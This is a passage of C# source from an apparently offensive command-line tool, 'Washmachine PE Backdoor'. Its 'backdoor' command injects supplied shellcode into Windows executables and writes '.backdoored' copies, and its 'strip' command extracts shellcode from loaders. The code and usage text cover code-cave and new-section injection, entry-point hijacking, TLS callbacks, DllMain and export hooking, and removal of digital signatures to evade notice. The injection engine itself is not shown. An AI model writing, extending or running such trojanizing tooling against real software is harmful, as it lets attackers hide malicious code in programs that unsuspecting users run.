            teeLogger?.FileOnly($"  --method        : {method}");
            teeLogger?.FileOnly($"  --encryption    : {encryption}");
            teeLogger?.FileOnly($"  --carrier       : {carrier}");
            teeLogger?.FileOnly($"  --xor-key       : 0x{xorKey:X2}");
            teeLogger?.FileOnly($"  --section-name  : {sectionName}");
            teeLogger?.FileOnly($"  --remove-sig    : {removeSig}");
            teeLogger?.FileOnly($"  --patch-sub     : {patchSubsystem}");
            teeLogger?.FileOnly($"  --preserve-entry: {preserveEntry}");
            teeLogger?.FileOnly($"  --patch-iat     : {patchIat}");
            teeLogger?.FileOnly($"  --patch-exit    : {patchExitCalls}");
            teeLogger?.FileOnly($"  --cave-min-size : {minCaveSize}");
            teeLogger?.FileOnly($"  --dry-run       : {dryRun}");
            teeLogger?.FileOnly($"  --verbose       : {verbose}");
            teeLogger?.FileOnly($"  --json          : {jsonOutput}");
            teeLogger?.FileOnly("");
        }

        try
        {
            // ── Instantiate services ─────────────────────────────────
            var service = new PeBackdoorService(paths, logger);
            var analyzerService = new PeAnalyzerService(logger);

            // ── Banner ───────────────────────────────────────────────
            if (!jsonOutput)
            {
                AnsiConsole.WriteLine();
                AnsiConsole.Write(new Panel($"[bold {UiColors.Header}]Washmachine PE Backdoor[/]")
                    .Border(BoxBorder.Double)
                    .BorderColor(Color.Cyan1));
                AnsiConsole.WriteLine();
            }

            // ── PE Analysis ──────────────────────────────────────────
            var peInfo = await service.AnalyzePeAsync(peFile);
            var analysisResult = await analyzerService.AnalyzeAsync(peFile);
            var shellcodeBytes = await File.ReadAllBytesAsync(shellcodeFile);

            // ── Log PE analysis to session file ──────────────────────
            teeLogger?.FileOnly("── Target PE Analysis ─────────────────────────────────────");
            teeLogger?.FileOnly($"  File        : {Path.GetFileName(peFile)}");
            teeLogger?.FileOnly($"  Full path   : {Path.GetFullPath(peFile)}");
            teeLogger?.FileOnly($"  Size        : {new FileInfo(peFile).Length:N0} bytes ({new FileInfo(peFile).Length / 1024.0 / 1024.0:F1} MB)");
            teeLogger?.FileOnly($"  Arch        : {(peInfo.Is64Bit ? "x64 (PE32+)" : "x86 (PE32)")}");
            teeLogger?.FileOnly($"  Type        : {(peInfo.IsDll ? "DLL" : "GUI Executable")}");
            teeLogger?.FileOnly($"  Entry point : 0x{peInfo.EntryPoint:X}");
            teeLogger?.FileOnly($"  ImageBase   : 0x{peInfo.ImageBase:X}");
            teeLogger?.FileOnly($"  Signature   : {(peInfo.HasSignature ? "Present (will be removed)" : "None")}");
            teeLogger?.FileOnly($"  .NET        : {(analysisResult.IsDotNet ? "Yes" : "No")}");
            teeLogger?.FileOnly($"  ASLR        : {(peInfo.HasAslr ? "Yes" : "No")}");
            teeLogger?.FileOnly($"  Sections    : {peInfo.Sections.Count}");
            teeLogger?.FileOnly("");
            teeLogger?.FileOnly("  Section table:");
            teeLogger?.FileOnly($"  {"Name",-10} {"VirtAddr",10} {"VirtSize",10} {"RawSize",10} {"Perms",6} {"Entropy",8}");
            teeLogger?.FileOnly($"  {new string('-', 10)} {new string('-', 10)} {new string('-', 10)} {new string('-', 10)} {new string('-', 6)} {new string('-', 8)}");
            foreach (var sec in analysisResult.Sections)
            {
                teeLogger?.FileOnly($"  {sec.Name,-10} {"0x" + sec.VirtualAddress.ToString("X6"),10} {"0x" + sec.VirtualSize.ToString("X6"),10} {"0x" + sec.RawSize.ToString("X6"),10} {sec.PermissionsString,6} {sec.Entropy,8:F2}");
            }
            teeLogger?.FileOnly("");
            teeLogger?.FileOnly("── Shellcode ──────────────────────────────────────────────");
            teeLogger?.FileOnly($"  File        : {Path.GetFileName(shellcodeFile)}");
            teeLogger?.FileOnly($"  Full path   : {Path.GetFullPath(shellcodeFile)}");
            teeLogger?.FileOnly($"  Size        : {shellcodeBytes.Length} bytes");
            teeLogger?.FileOnly($"  First bytes : {BitConverter.ToString(shellcodeBytes.Take(Math.Min(32, shellcodeBytes.Length)).ToArray()).Replace("-", " ")}");
            teeLogger?.FileOnly($"  SHA-256     : {Convert.ToHexString(System.Security.Cryptography.SHA256.HashData(shellcodeBytes))}");
            teeLogger?.FileOnly("");
            teeLogger?.FileOnly("── Pre-flight Checks ──────────────────────────────────────");
            teeLogger?.FileOnly($"  .NET assembly     : {(analysisResult.IsDotNet ? "FAIL (is .NET)" : "PASS (not .NET)")}");
            teeLogger?.FileOnly($"  Packed check      : {(analysisResult.IsPossiblyPacked ? $"WARN (entropy: {analysisResult.OverallEntropy:F2})" : $"PASS (entropy: {analysisResult.OverallEntropy:F2})")}");
            teeLogger?.FileOnly($"  Entry point valid : {(peInfo.EntryPoint != 0 ? $"PASS (0x{peInfo.EntryPoint:X})" : "FAIL (null)")}");
            teeLogger?.FileOnly($"  Digital signature : {(peInfo.HasSignature ? "Present → will strip" : "None")}");
            teeLogger?.FileOnly("");
            teeLogger?.FileOnly("── Injection Plan ─────────────────────────────────────────");
            teeLogger?.FileOnly($"  Method      : {injectionMethod}");
            teeLogger?.FileOnly($"  Encryption  : {encryptionMethod}");
            teeLogger?.FileOnly($"  Carrier     : {carrierInvoke}");
            teeLogger?.FileOnly($"  Remove sig  : {removeSig}");
            teeLogger?.FileOnly($"  Patch GUI   : {patchSubsystem}");
            teeLogger?.FileOnly($"  Patch exit  : {patchExitCalls}");
            teeLogger?.FileOnly("");

            // Copy original shellcode to session directory
            if (sessionDir != null && appSettings.SaveShellcodeCopy)
            {
                try
                {
                    File.Copy(shellcodeFile, Path.Combine(sessionDir, Path.GetFileName(shellcodeFile)), overwrite: true);
                    teeLogger?.FileOnly($"  Copied shellcode to session: {Path.GetFileName(shellcodeFile)}");
                }
                catch (Exception ex)
                {
                    teeLogger?.FileOnly($"  Warning: Could not copy shellcode to session: {ex.Message}");
                }
            }
            teeLogger?.FileOnly("");

            if (!jsonOutput)
            {
                AnsiConsole.Write(new Rule($"[bold {UiColors.Header}]Target PE Analysis[/]").RuleStyle(Style.Parse(UiColors.Rule)).LeftJustified());
                AnsiConsole.WriteLine();

                var peTable = new Table()
                    .Border(TableBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .HideHeaders()
                    .AddColumn("Property")
                    .AddColumn("Value");

                peTable.AddRow("[{UiColors.Accent}]File[/]", $"[white]{Markup.Escape(Path.GetFileName(peFile))}[/]");
                peTable.AddRow("[{UiColors.Accent}]Size[/]", $"[white]{new FileInfo(peFile).Length:N0} bytes ({new FileInfo(peFile).Length / 1024.0 / 1024.0:F1} MB)[/]");
                peTable.AddRow("[{UiColors.Accent}]Arch[/]", $"[white]{(peInfo.Is64Bit ? "x64 (PE32+)" : "x86 (PE32)")}[/]");
                peTable.AddRow("[{UiColors.Accent}]Type[/]", $"[white]{(peInfo.IsDll ? "DLL" : "GUI Executable")}[/]");
                peTable.AddRow("[{UiColors.Accent}]Entry[/]", $"[mediumpurple1]0x{peInfo.EntryPoint:X}[/]");
                peTable.AddRow("[{UiColors.Accent}]ImageBase[/]", $"[mediumpurple1]0x{peInfo.ImageBase:X}[/]");
                peTable.AddRow("[{UiColors.Accent}]Signature[/]", $"[white]{(peInfo.HasSignature ? "Present (will be removed)" : "None")}[/]");
                peTable.AddRow("[{UiColors.Accent}].NET[/]", $"[white]{(analysisResult.IsDotNet ? "Yes" : "No")}[/]");
                peTable.AddRow("[{UiColors.Accent}]ASLR[/]", $"[white]{(peInfo.HasAslr ? "Yes" : "No")}[/]");
                peTable.AddRow("[{UiColors.Accent}]Sections[/]", $"[white]{peInfo.Sections.Count}[/]");

                AnsiConsole.Write(peTable);
                AnsiConsole.WriteLine();

                var sectionTable = new Table()
                    .Border(TableBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Section[/]").LeftAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]VirtAddr[/]").RightAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]VirtSize[/]").RightAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]RawSize[/]").RightAligned())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Perms[/]").Centered())
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]Entropy[/]").RightAligned());

                foreach (var sec in analysisResult.Sections)
                {
                    string entropyColor = sec.Entropy < 6.0 ? "green3_1" : sec.Entropy < 7.0 ? "yellow" : "red";
                    sectionTable.AddRow(
                        Markup.Escape(sec.Name),
                        $"[mediumpurple1]0x{sec.VirtualAddress:X6}[/]",
                        $"[mediumpurple1]0x{sec.VirtualSize:X6}[/]",
                        $"[mediumpurple1]0x{sec.RawSize:X6}[/]",
                        Markup.Escape(sec.PermissionsString),
                        $"[{entropyColor}]{sec.Entropy:F2}[/]"
                    );
                }

                AnsiConsole.Write(sectionTable);

                // Code caves
                AnsiConsole.WriteLine();
                var caves = await service.FindCodeCavesAsync(peFile, Math.Max(minCaveSize, 50));

                // Log all caves to session file
                teeLogger?.FileOnly("── Code Caves ─────────────────────────────────────────────");
                teeLogger?.FileOnly($"  Total found: {caves.Count}");
                if (caves.Count > 0)
                {
                    teeLogger?.FileOnly($"  {"Section",-10} {"Offset",10} {"RVA",10} {"Size",12}");
                    teeLogger?.FileOnly($"  {new string('-', 10)} {new string('-', 10)} {new string('-', 10)} {new string('-', 12)}");
                    foreach (var c in caves)
                        teeLogger?.FileOnly($"  {c.SectionName,-10} {"0x" + c.FileOffset.ToString("X6"),10} {"0x" + c.VirtualAddress.ToString("X6"),10} {c.Size,8} bytes");
                    teeLogger?.FileOnly($"  Largest: {caves[0].SectionName} ({caves[0].Size:N0} bytes)");
                }
                teeLogger?.FileOnly("");

                AnsiConsole.Write(new Rule($"[bold {UiColors.Header}]Code Caves[/]").RuleStyle(Style.Parse(UiColors.Rule)).LeftJustified());
                AnsiConsole.MarkupLine($"  [{UiColors.Accent}]Found:[/] [white]{caves.Count}[/]");

                if (caves.Count > 0)
                {
                    var caveTable = new Table()
                        .Border(TableBorder.Rounded)
                        .BorderColor(UiColors.BoxBorderColor)
                        .AddColumn($"[{UiColors.Accent}]Section[/]")
                        .AddColumn($"[{UiColors.Accent}]Offset[/]")
                        .AddColumn($"[{UiColors.Accent}]RVA[/]")
                        .AddColumn($"[{UiColors.Accent}]Size[/]");

                    foreach (var cave in caves.Take(10))
                    {
                        caveTable.AddRow(
                            Markup.Escape(cave.SectionName),
                            $"[mediumpurple1]0x{cave.FileOffset:X6}[/]",
                            $"[mediumpurple1]0x{cave.VirtualAddress:X6}[/]",
                            $"[white]{cave.Size,6} bytes[/]"
                        );
                    }

                    AnsiConsole.Write(caveTable);

                    if (caves.Count > 10)
                        AnsiConsole.MarkupLine($"  [grey]... and {caves.Count - 10} more[/]");
                    AnsiConsole.MarkupLine($"  [{UiColors.Accent}]Largest:[/] [white]{Markup.Escape(caves[0].SectionName)} ({caves[0].Size:N0} bytes)[/]");
                }

                // Shellcode info
                AnsiConsole.WriteLine();
                AnsiConsole.Write(new Rule($"[bold {UiColors.Header}]Shellcode[/]").RuleStyle(Style.Parse(UiColors.Rule)).LeftJustified());

                var scTable = new Table()
                    .Border(TableBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .HideHeaders()
                    .AddColumn("Property")
                    .AddColumn("Value");

                scTable.AddRow("[{UiColors.Accent}]File[/]", $"[white]{Markup.Escape(Path.GetFileName(shellcodeFile))}[/]");
                scTable.AddRow("[{UiColors.Accent}]Size[/]", $"[white]{shellcodeBytes.Length} bytes[/]");
                scTable.AddRow("[{UiColors.Accent}]First bytes[/]", $"[mediumpurple1]{BitConverter.ToString(shellcodeBytes.Take(Math.Min(16, shellcodeBytes.Length)).ToArray()).Replace("-", " ")}[/]");

                AnsiConsole.Write(scTable);

                // Pre-flight checks
                AnsiConsole.WriteLine();
                AnsiConsole.Write(new Rule($"[bold {UiColors.Header}]Pre-flight Checks[/]").RuleStyle(Style.Parse(UiColors.Rule)).LeftJustified());
                PrintCheck(!analysisResult.IsDotNet, "Not a .NET assembly");
                PrintCheck(!analysisResult.IsPossiblyPacked, $"Not packed (entropy: {analysisResult.OverallEntropy:F2})");
                PrintCheck(peInfo.EntryPoint != 0, $"Entry point is valid (0x{peInfo.EntryPoint:X})");

                if (injectionMethod == InjectionMethod.CodeCave)
                {
                    int stubOverhead = peInfo.Is64Bit ? 66 : 14;
                    int needed = shellcodeBytes.Length + stubOverhead;
                    bool hasCave = caves.Any(c => c.Size >= needed);
                    PrintCheck(hasCave, $"Sufficient code cave space ({(hasCave ? $"{caves[0].Size:N0}" : "0")} >= {needed} bytes needed)");
                }

                PrintCheck(!peInfo.HasSignature || removeSig, peInfo.HasSignature
                    ? "PE has digital signature (will be removed)"
                    : "No digital signature");

                // Injection plan
                AnsiConsole.WriteLine();
                AnsiConsole.Write(new Rule($"[bold {UiColors.Header}]Injection Plan[/]").RuleStyle(Style.Parse(UiColors.Rule)).LeftJustified());

                var planTable = new Table()
                    .Border(TableBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .HideHeaders()
                    .AddColumn("Property")
                    .AddColumn("Value");

                planTable.AddRow("[{UiColors.Accent}]Method[/]", $"[white]{injectionMethod}[/]");
                planTable.AddRow("[{UiColors.Accent}]Encryption[/]", $"[white]{encryptionMethod}{(encryptionMethod == PayloadEncryption.Xor ? $" (key=0x{xorKey:X2})" : "")}[/]");
                planTable.AddRow("[{UiColors.Accent}]Invoke[/]", $"[white]{carrierInvoke}[/]");
                planTable.AddRow("[{UiColors.Accent}]Remove sig[/]", $"[white]{removeSig}[/]");
                planTable.AddRow("[{UiColors.Accent}]Patch GUI[/]", $"[white]{patchSubsystem}[/]");

                AnsiConsole.Write(planTable);
                AnsiConsole.WriteLine();
            }

            if (dryRun)
            {
                teeLogger?.FileOnly("── Dry Run ────────────────────────────────────────────────");
                teeLogger?.FileOnly("  No injection performed (--dry-run flag).");
                teeLogger?.FileOnly($"  Session dir: {sessionDir}");
                if (!jsonOutput)
                {
                    var dryRunText = $"[green3_1]Dry run \u2014 no injection performed.[/]";
                    if (sessionDir != null)
                        dryRunText += $"\n[grey]Session log: {Markup.Escape(sessionDir)}[/]";
                    AnsiConsole.Write(new Panel(dryRunText)
                        .BorderColor(Color.Green)
                        .Border(BoxBorder.Rounded));
                }
                return 0;
            }

            // ── Inject ───────────────────────────────────────────────
            var options = new PeBackdoorOptions
            {
                TargetPePath = peFile,
                ShellcodePath = shellcodeFile,
                OutputPath = outputFile ?? Path.Combine(
                    Path.GetDirectoryName(peFile) ?? ".",
                    Path.GetFileNameWithoutExtension(peFile) + ".backdoored" + Path.GetExtension(peFile)),
                Method = injectionMethod,
                Encryption = encryptionMethod,
                CarrierInvoke = carrierInvoke,
                XorKey = xorKey,
                NewSectionName = sectionName,
                RemoveSignature = removeSig,
                PatchSubsystemToGui = patchSubsystem,
                PreserveOriginalEntry = preserveEntry,
                PatchIat = patchIat,
                PatchExitCalls = patchExitCalls,
                MinCaveSize = minCaveSize,
            };

            var result = jsonOutput
                ? await service.BackdoorAsync(options)
                : await AnsiConsole.Status()
                    .Spinner(Spinner.Known.Dots)
                    .SpinnerStyle(Style.Parse(UiColors.Header))
                    .StartAsync("Injecting payload...", async _ => await service.BackdoorAsync(options));

            // ── Log injection result to session ──────────────────────
            teeLogger?.FileOnly("── Injection Result ───────────────────────────────────────");
            teeLogger?.FileOnly($"  Success        : {result.Success}");
            if (!string.IsNullOrEmpty(result.ErrorMessage))
                teeLogger?.FileOnly($"  Error          : {result.ErrorMessage}");
            teeLogger?.FileOnly($"  Output path    : {result.OutputPath ?? "(none)"}");
            teeLogger?.FileOnly($"  Shellcode addr : 0x{result.ShellcodeAddress:X}");
            teeLogger?.FileOnly($"  Carrier addr   : 0x{result.CarrierAddress:X}");
            teeLogger?.FileOnly($"  Shellcode size : {result.ShellcodeSize} bytes");
            teeLogger?.FileOnly($"  Carrier size   : {result.CarrierSize} bytes");
            teeLogger?.FileOnly("");
            teeLogger?.FileOnly("  Steps:");
            foreach (var step in result.Steps)
                teeLogger?.FileOnly($"    ✓ {step}");
            if (result.Warnings.Count > 0)
            {
                teeLogger?.FileOnly("  Warnings:");
                foreach (var warn in result.Warnings)
                    teeLogger?.FileOnly($"    ⚠ {warn}");
            }
            teeLogger?.FileOnly("");

            // Copy the backdoored binary to session directory
            if (sessionDir != null && appSettings.SaveBinaryArtifact
                && result.Success && !string.IsNullOrEmpty(result.OutputPath) && File.Exists(result.OutputPath))
            {
                try
                {
                    string destBinaryName = Path.GetFileName(result.OutputPath);
                    string destBinaryPath = Path.Combine(sessionDir, destBinaryName);
                    File.Copy(result.OutputPath, destBinaryPath, overwrite: true);
                    var outputInfo = new FileInfo(result.OutputPath);
                    teeLogger?.FileOnly($"── Binary Artifact ────────────────────────────────────────");
                    teeLogger?.FileOnly($"  Copied to session: {destBinaryName}");
                    teeLogger?.FileOnly($"  Size             : {outputInfo.Length:N0} bytes");
                    teeLogger?.FileOnly($"  SHA-256          : {Convert.ToHexString(System.Security.Cryptography.SHA256.HashData(File.ReadAllBytes(result.OutputPath)))}");
                    teeLogger?.FileOnly("");
                }
                catch (Exception ex)
                {
                    teeLogger?.FileOnly($"  Warning: Could not copy binary to session: {ex.Message}");
                }
            }

            teeLogger?.FileOnly("── Session Complete ───────────────────────────────────────");
            teeLogger?.FileOnly($"  Finished at : {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
            teeLogger?.FileOnly($"  Session dir : {sessionDir}");
            teeLogger?.FileOnly("════════════════════════════════════════════════════════════");

            if (jsonOutput)
            {
                var output = new
                {
                    result.Success,
                    result.OutputPath,
                    result.ErrorMessage,
                    result.ShellcodeAddress,
                    result.CarrierAddress,
                    result.ShellcodeSize,
                    result.CarrierSize,
                    result.Warnings,
                    result.Steps,
                    SessionDirectory = sessionDir,
                };
                Console.WriteLine(System.Text.Json.JsonSerializer.Serialize(output, JsonPrint));
            }
            else
            {
                foreach (var step in result.Steps)
                    AnsiConsole.MarkupLine($"    [green3_1]\u2713[/] {Markup.Escape(step)}");

                foreach (var warn in result.Warnings)
                    AnsiConsole.MarkupLine($"    [yellow]\u26A0[/] {Markup.Escape(warn)}");

                AnsiConsole.WriteLine();
                if (result.Success)
                {
                    var successText = $"[green3_1]SUCCESS: Backdoored PE written to {Markup.Escape(result.OutputPath ?? "unknown")}[/]\n" +
                        $"[grey]Output size: {new FileInfo(result.OutputPath!).Length:N0} bytes[/]";
                    if (sessionDir != null)
                        successText += $"\n[grey]Session log: {Markup.Escape(sessionDir)}[/]";
                    AnsiConsole.Write(new Panel(successText)
                        .BorderColor(Color.Green)
                        .Border(BoxBorder.Rounded));
                }
                else
                {
                    var failText = $"[red]FAILED: {Markup.Escape(result.ErrorMessage ?? "unknown")}[/]";
                    if (sessionDir != null)
                        failText += $"\n[grey]Session log: {Markup.Escape(sessionDir)}[/]";
                    AnsiConsole.Write(new Panel(failText)
                        .BorderColor(Color.Red)
                        .Border(BoxBorder.Rounded));
                    return 1;
                }
            }

            return result.Success ? 0 : 1;
        }
        catch (Exception ex)
        {
            teeLogger?.FileOnly("── EXCEPTION ──────────────────────────────────────────────");
            teeLogger?.FileOnly($"  {ex.GetType().Name}: {ex.Message}");
            teeLogger?.FileOnly($"  Stack trace:\n{ex.StackTrace}");
            teeLogger?.FileOnly($"  Session dir: {sessionDir}");

            if (jsonOutput)
            {
                Console.WriteLine(System.Text.Json.JsonSerializer.Serialize(new { Success = false, Error = ex.Message, SessionDirectory = sessionDir }, JsonPrint));
            }
            else
            {
                logger.Error($"Backdoor failed: {ex.Message}");
                if (verbose) logger.Error(ex.StackTrace ?? "");
                if (sessionDir != null)
                    AnsiConsole.MarkupLine($"  [grey]Session log: {Markup.Escape(sessionDir)}[/]");
            }
            return 1;
        }
        finally
        {
            teeLogger?.Dispose();
        }
    }

    private static void PrintCheck(bool ok, string message)
    {
        var icon = ok ? "[green3_1]\u2713[/]" : "[red]\u2717[/]";
        AnsiConsole.MarkupLine($"    {icon} {Markup.Escape(message)}");
    }

    private static int PrintBackdoorUsage()
    {
        UsageFormatter.Print(new CommandUsage(
            Name: "backdoor",
            Syntax: $"backdoor [{UiColors.Warning}]--pe <file>[/] [{UiColors.Warning}]--shellcode <file>[/] [{UiColors.Muted}][[options]][/]",
            Description: "Inject shellcode into an existing PE file",
            Required: new[]
            {
                new UsageOption("--pe <file>", "Target PE file to backdoor"),
                new UsageOption("--shellcode, -s <file>", "Shellcode .bin file to inject"),
            },
            Options: new[]
            {
                new UsageOption("--output, -o <file>", "Output file", "<input>.backdoored.exe"),
                new UsageOption("--method, -m <method>", "code-cave | new-section | section-ext | text-pad | tls-callback", "code-cave"),
                new UsageOption("--section-name <name>", "Name for new section (new-section, tls-callback)", ".extra"),
                new UsageOption("--carrier <invoke>", "Payload carrier method (see carrier types below)", "entry-point"),
                new UsageOption("--no-remove-sig", "Keep the PE digital signature"),
                new UsageOption("--no-patch-subsystem", "Don't patch subsystem to GUI"),
                new UsageOption("--no-patch-exit", "Don't patch exit calls (ExitProcess → ExitThread)"),
                new UsageOption("--cave-min-size <n>", "Minimum code cave size in bytes (code-cave only)"),
                new UsageOption("--dry-run", "Analyze and report without injecting"),
                new UsageOption("--verbose", "Show detailed logging"),
                new UsageOption("--json", "Output results as JSON"),
            },
            Examples: new[]
            {
                new UsageExample("backdoor --pe app.exe -s calc.bin", "Inject using default code-cave method"),
                new UsageExample("backdoor --pe app.exe -s payload.bin -m new-section", "Add a new PE section for the payload"),
                new UsageExample("backdoor --pe app.exe -s shell.bin -m text-pad", "Use .text section padding gap"),
                new UsageExample("backdoor --pe app.exe -s shell.bin -m tls-callback", "Execute via TLS callback (runs before main)"),
                new UsageExample("backdoor --pe app.exe -s shell.bin -m section-ext", "Extend the last section"),
                new UsageExample("backdoor --pe app.exe -s shell.bin --dry-run --verbose", "Dry run with verbose analysis"),
            },
            Notes: new[]
            {
                $"[bold {UiColors.Accent}]Injection Methods:[/]",
                $"  [{UiColors.Accent}]code-cave[/]     — find null-byte gaps in existing sections (stealthy, size-limited)",
                $"  [{UiColors.Accent}]new-section[/]   — add a new PE section for the payload (reliable, obvious in section table)",
                $"  [{UiColors.Accent}]section-ext[/]   — extend the last section (no new header, changes last section size)",
                $"  [{UiColors.Accent}]text-pad[/]      — write into .text VirtualSize↔RawSize padding gap (no structural changes)",
                $"  [{UiColors.Accent}]tls-callback[/]  — create a TLS callback that runs the payload before main (x64 only)",
                "",
                $"[bold {UiColors.Accent}]Carrier Types (--carrier):[/]",
                $"  [{UiColors.Accent}]entry-point[/]   — hijack the PE entry point to redirect to payload (default)",
                $"  [{UiColors.Accent}]tls-callback[/]  — install a TLS callback that executes before main (x64)",
                $"  [{UiColors.Accent}]dll-main[/]      — hook DllMain for DLL payloads (DLL targets only)",
                $"  [{UiColors.Accent}]dll-export[/]    — hook a specific DLL export function (DLL targets only)",
                $"  [{UiColors.Accent}]entry-func[/]    — backdoor a JMP/CALL instruction in the entry function",
                "",
                "The backdoor expects a ready-to-run flat .bin payload.",
                $"Use [{UiColors.Accent}]encode[/] to build shellcode into a loader, or provide raw shellcode directly.",
            }));
        return 0;
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  strip
    // ═══════════════════════════════════════════════════════════════════════

    private static async Task<int> RunStripAsync(string[] args)
    {
        if (args.Length == 0)
            return await RunSubMode("strip", RunStripAsync, PrintStripUsage);

        if (args[0] is "--help" or "-h")
        {
            PrintStripUsage();
            return 0;
        }

        string peFile = args[0];
        string? outputFile = null;
        string? sectionName = null;
        bool analyze = false;
        bool noTrim = false;
        var mode = StripMode.EntryPointToEnd;
        uint rangeStart = 0, rangeLen = 0;

        for (int i = 1; i < args.Length; i++)
        {
            switch (args[i])
            {
                case "-o" or "--output":
                    if (++i < args.Length) outputFile = args[i];
                    break;
                case "--mode" or "-m":
                    if (++i < args.Length)
                    {
                        mode = args[i].ToLowerInvariant() switch
                        {
                            "ep" or "entry-point" => StripMode.EntryPointToEnd,
                            "section"             => StripMode.Section,
                            "all-exec"            => StripMode.AllExecutable,
                            "range"               => StripMode.RawRange,
                            _ => mode,
                        };
                    }
                    break;
                case "--section":
                    if (++i < args.Length) sectionName = args[i];
                    break;
                case "--analyze":
                    analyze = true;
                    break;
                case "--no-trim":
                    noTrim = true;
                    break;
                case "--range":
                    if (++i < args.Length)
                    {
                        var parts = args[i].Split(':');
                        if (parts.Length == 2)
                        {
                            rangeStart = Convert.ToUInt32(parts[0], parts[0].StartsWith("0x", StringComparison.OrdinalIgnoreCase) ? 16 : 10);
                            rangeLen = Convert.ToUInt32(parts[1], parts[1].StartsWith("0x", StringComparison.OrdinalIgnoreCase) ? 16 : 10);
                        }
                    }
                    break;
            }
        }

        if (!File.Exists(peFile))
        {
            AnsiConsole.MarkupLine($"[red]File not found:[/] [white]{Markup.Escape(peFile)}[/]");
            return 1;
        }

        var logger = new ConsoleLogger();
        var stripper = new PeStripService(logger);

        if (analyze)
        {
            var analysis = await stripper.AnalyzeAsync(peFile);

            AnsiConsole.Write(new Panel($"[bold {UiColors.Header}]PE Strip Analysis[/]  [grey]{Markup.Escape(peFile)}[/]")
                .BorderColor(Color.Cyan1)
                .Border(BoxBorder.Rounded));
            AnsiConsole.WriteLine();

            AnsiConsole.MarkupLine($"  [{UiColors.Accent}]Architecture:[/]  [white]{(analysis.Is64Bit ? "x64" : "x86")}[/]");
            AnsiConsole.MarkupLine($"  [{UiColors.Accent}]Entry Point:[/]   [mediumpurple1]0x{analysis.EntryPoint:X8}[/]");
            AnsiConsole.MarkupLine($"  [{UiColors.Accent}]EP Section:[/]    [white]{Markup.Escape(analysis.EntryPointSection ?? "unknown")}[/]");
            AnsiConsole.WriteLine();

            var table = new Table()
                .Border(TableBorder.Rounded)
                .BorderColor(UiColors.BoxBorderColor)
                .AddColumn(new TableColumn($"[{UiColors.Accent}]Section[/]").LeftAligned())
                .AddColumn(new TableColumn($"[{UiColors.Accent}]RawAddr[/]").RightAligned())
                .AddColumn(new TableColumn($"[{UiColors.Accent}]RawSize[/]").RightAligned())
                .AddColumn(new TableColumn($"[{UiColors.Accent}]Perms[/]").Centered())
                .AddColumn(new TableColumn($"[{UiColors.Accent}]EP[/]").Centered());

            foreach (var sec in analysis.Sections)
            {
                string perms = (sec.IsReadable ? "R" : "-") + (sec.IsWritable ? "W" : "-") + (sec.IsExecutable ? "X" : "-");
                table.AddRow(
                    Markup.Escape(sec.Name),
                    $"[mediumpurple1]0x{sec.RawAddress:X8}[/]",
                    $"[mediumpurple1]0x{sec.RawSize:X8}[/]",
                    $"[white]{perms}[/]",
                    sec.ContainsEntryPoint ? "[green3_1]<<<[/]" : ""
                );
            }

            AnsiConsole.Write(table);
            return 0;
        }

        outputFile ??= Path.Combine(
            Path.GetDirectoryName(peFile) ?? ".",
            Path.GetFileNameWithoutExtension(peFile) + ".bin");

        var options = new StripOptions
        {
            InputPath = peFile,
            OutputPath = outputFile,
            Mode = mode,
            SectionName = sectionName,
            TrimTrailingZeros = !noTrim,
            RawOffset = rangeStart,
            RawLength = (int)rangeLen,
        };

        try
        {
            var result = await AnsiConsole.Status()
                .Spinner(Spinner.Known.Dots)
                .SpinnerStyle(Style.Parse("cyan"))
                .StartAsync("Stripping PE...", async _ => await stripper.StripAsync(options));

            foreach (var w in result.Warnings)
                AnsiConsole.MarkupLine($"    [yellow]\u26A0[/] {Markup.Escape(w)}");

            if (result.Success)
            {
                AnsiConsole.Write(new Panel(
                    $"[green3_1]Extracted {result.ExtractedSize:N0} bytes to {Markup.Escape(result.OutputPath ?? "unknown")}[/]\n" +
                    $"[grey]Original: {result.OriginalSize:N0} bytes | Trimmed: {result.TrimmedBytes:N0} bytes[/]")
                    .BorderColor(Color.Green)
                    .Border(BoxBorder.Rounded));
            }
            else
            {
                AnsiConsole.Write(new Panel($"[red]{Markup.Escape(result.Error ?? "Unknown error")}[/]")
                    .BorderColor(Color.Red)
                    .Border(BoxBorder.Rounded));
                return 1;
            }

            return 0;
        }
        catch (Exception ex)
        {
            AnsiConsole.MarkupLine($"[red]Strip failed:[/] [white]{Markup.Escape(ex.Message)}[/]");
            return 1;
        }
    }

    private static int PrintStripUsage()
    {
        UsageFormatter.Print(new CommandUsage(
            Name: "strip",
            Syntax: $"strip [{UiColors.Warning}]<pe-file>[/] [{UiColors.Muted}][[options]][/]",
            Description: "Extract flat binary (.bin) from a PE file",
            Required: new[]
            {
                new UsageOption("<pe-file>", "Path to the PE file to extract from"),
            },
            Options: new[]
            {
                new UsageOption("-o, --output <file>", "Output .bin path", "<input>.bin"),
                new UsageOption("-m, --mode <mode>", "ep | section | all-exec | range", "ep"),
                new UsageOption("--section <name>", "Section name (for 'section' mode)"),
                new UsageOption("--range <start:len>", "Raw file range (for 'range' mode, hex ok)"),
                new UsageOption("--no-trim", "Don't trim trailing zeros"),
                new UsageOption("--analyze", "Show section layout without extracting"),
            },
            Examples: new[]
            {
                new UsageExample("strip loader.exe", "Extract from entry point to end of .text"),
                new UsageExample("strip loader.exe -m section --section .text", "Extract entire .text section"),
                new UsageExample("strip loader.exe -m all-exec", "Extract all executable sections"),
                new UsageExample("strip loader.exe -m range --range 0x400:0x200", "Extract a specific byte range"),
                new UsageExample("strip loader.exe --analyze", "Analyze section layout only"),
            },
            Notes: new[]
            {
                "Extraction modes:",
                $"  [{UiColors.Accent}]ep[/]        — from entry point to end of containing section (default)",
                $"  [{UiColors.Accent}]section[/]   — extract a specific section by name",
                $"  [{UiColors.Accent}]all-exec[/]  — extract all executable sections concatenated",
                $"  [{UiColors.Accent}]range[/]     — extract a raw file offset range",
            }));
        return 0;
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  list
    // ═══════════════════════════════════════════════════════════════════════

